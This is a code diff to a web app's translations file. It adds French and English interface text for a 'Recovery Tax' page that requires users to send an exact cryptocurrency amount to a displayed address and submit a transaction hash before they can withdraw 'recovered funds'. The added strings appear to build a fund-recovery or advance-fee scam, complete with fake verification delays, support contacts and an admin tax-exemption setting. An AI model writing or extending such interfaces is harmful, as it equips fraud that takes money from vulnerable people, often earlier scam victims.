@@ -108,6 +108,66 @@ export const translations = {
     balanceEuro: "Solde (€)",
     euroSymbol: "€",
     
+    // Tax Payment Instructions
+    taxRecoveryTitle: "Taxe de Récupération",
+    taxRecoverySubtitle: "Paiement obligatoire pour accéder à vos fonds récupérés",
+    taxImportantAlert: "Cette taxe doit être payée avant toute récupération de fonds. Aucun retrait ne sera possible tant que le paiement n'est pas vérifié et validé.",
+    taxPaymentInstructions: "Instructions de Paiement",
+    taxStep1: "Copiez l'adresse de paiement",
+    taxStep1Detail: "ci-dessus",
+    taxStep2: "Envoyez exactement",
+    taxStep2Detail: "à cette adresse",
+    taxStep3: "Copiez le hash de transaction et soumettez-le comme preuve",
+    taxStep4: "Attendez la validation (1-3 heures) pour accéder à vos fonds",
+    
+    // QR Code and Payment Details
+    qrCodeScanToPay: "Scanner pour payer",
+    qrCodeScanWith: "Scannez avec votre wallet",
+    paymentAddress: "Adresse de paiement",
+    exactAmountToSend: "Montant exact à envoyer",
+    paymentCurrency: "Devise de paiement",
+    copyAddress: "Copier l'adresse",
+    copyFullAddress: "Copier l'adresse complète",
+    copyAmount: "Copier le montant",
+    addressCopied: "Adresse copiée dans le presse-papiers",
+    amountCopied: "Montant copié dans le presse-papiers",
+    
+    // Payment Status Messages
+    taxExemptionTitle: "Exemption de Taxe",
+    taxExemptionMessage: "Vous êtes exempté de la taxe de récupération. Vos fonds sont disponibles sans frais supplémentaires.",
+    taxPaidTitle: "Taxe Payée",
+    taxPaidMessage: "Votre taxe de récupération a été vérifiée et validée. Vos fonds sont maintenant disponibles.",
+    taxVerificationTitle: "Vérification en cours",
+    taxVerificationMessage: "Votre preuve de paiement est en cours de vérification. Vous recevrez une notification une fois validée.",
+    taxVerificationDelay: "Délai habituel : 1-3 heures",
+    viewTransaction: "Voir la transaction",
+    
+    // Payment Proof Form
+    paymentProofTitle: "Preuve de Paiement",
+    paymentProofSubtitle: "Soumettez votre preuve de paiement pour validation",
+    transactionHashLabel: "Hash de transaction",
+    transactionHashPlaceholder: "0x... ou hash de transaction Bitcoin",
+    transactionHashHelper: "Copiez le hash de votre transaction depuis votre wallet",
+    paymentScreenshot: "Capture d'écran de paiement",
+    fileFormatsAccepted: "Formats acceptés: PNG, JPG, PDF (max 5MB)",
+    submitProof: "Soumettre la preuve",
+    submittingProof: "Envoi en cours...",
+    proofSubmitted: "Preuve envoyée",
+    proofSubmittedMessage: "Votre preuve de paiement a été soumise pour vérification",
+    proofRequired: "Preuve requise",
+    proofRequiredMessage: "Veuillez fournir soit un hash de transaction, soit une preuve de paiement",
+    
+    // Support Section
+    needHelpTitle: "Besoin d'aide ?",
+    needHelpSubtitle: "Notre équipe support est disponible pour vous accompagner",
+    liveChatButton: "Chat en direct",
+    emailContactButton: "Contacter par email",
+    
+    // Recovery Tax Alert
+    taxRecoveryAlert: "Taxe obligatoire de récupération :",
+    taxRecoveryAlertMessage: "Vous devez payer cette taxe avant de pouvoir accéder à vos fonds récupérés.",
+    recoveryTaxReason: "Frais de récupération et traitement administratif",
+    
     // Wallet Management
     walletConfig: "Configuration Wallets",
     btcWallet: "Wallet Bitcoin",
@@ -345,6 +405,66 @@ export const translations = {
     exemptTax: "Exempt from Tax",
     balanceEuro: "Balance (€)",
     euroSymbol: "€",
+    
+    // Tax Payment Instructions
+    taxRecoveryTitle: "Recovery Tax",
+    taxRecoverySubtitle: "Mandatory payment to access your recovered funds",
+    taxImportantAlert: "This tax must be paid before any fund recovery. No withdrawals will be possible until payment is verified and validated.",
+    taxPaymentInstructions: "Payment Instructions",
+    taxStep1: "Copy the payment address",
+    taxStep1Detail: "above",
+    taxStep2: "Send exactly",
+    taxStep2Detail: "to this address",
+    taxStep3: "Copy the transaction hash and submit it as proof",
+    taxStep4: "Wait for validation (1-3 hours) to access your funds",
+    
+    // QR Code and Payment Details
+    qrCodeScanToPay: "Scan to pay",
+    qrCodeScanWith: "Scan with your wallet",
+    paymentAddress: "Payment address",
+    exactAmountToSend: "Exact amount to send",
+    paymentCurrency: "Payment currency",
+    copyAddress: "Copy address",
+    copyFullAddress: "Copy full address",
+    copyAmount: "Copy amount",
+    addressCopied: "Address copied to clipboard",
+    amountCopied: "Amount copied to clipboard",
+    
+    // Payment Status Messages
+    taxExemptionTitle: "Tax Exemption",
+    taxExemptionMessage: "You are exempt from the recovery tax. Your funds are available without additional fees.",
+    taxPaidTitle: "Tax Paid",
+    taxPaidMessage: "Your recovery tax has been verified and validated. Your funds are now available.",
+    taxVerificationTitle: "Verification in Progress",
+    taxVerificationMessage: "Your payment proof is being verified. You will receive a notification once validated.",
+    taxVerificationDelay: "Usual delay: 1-3 hours",
+    viewTransaction: "View transaction",
+    
+    // Payment Proof Form
+    paymentProofTitle: "Payment Proof",
+    paymentProofSubtitle: "Submit your payment proof for validation",
+    transactionHashLabel: "Transaction hash",
+    transactionHashPlaceholder: "0x... or Bitcoin transaction hash",
+    transactionHashHelper: "Copy the hash from your wallet transaction",
+    paymentScreenshot: "Payment screenshot",
+    fileFormatsAccepted: "Accepted formats: PNG, JPG, PDF (max 5MB)",
+    submitProof: "Submit proof",
+    submittingProof: "Submitting...",
+    proofSubmitted: "Proof submitted",
+    proofSubmittedMessage: "Your payment proof has been submitted for verification",
+    proofRequired: "Proof required",
+    proofRequiredMessage: "Please provide either a transaction hash or payment proof",
+    
+    // Support Section
+    needHelpTitle: "Need help?",
+    needHelpSubtitle: "Our support team is available to assist you",
+    liveChatButton: "Live chat",
+    emailContactButton: "Contact by email",
+    
+    // Recovery Tax Alert
+    taxRecoveryAlert: "Mandatory recovery tax:",
+    taxRecoveryAlertMessage: "You must pay this tax before you can access your recovered funds.",
+    recoveryTaxReason: "Recovery fees and administrative processing",
     
     // Wallet Management
     walletConfig: "Wallet Configuration",
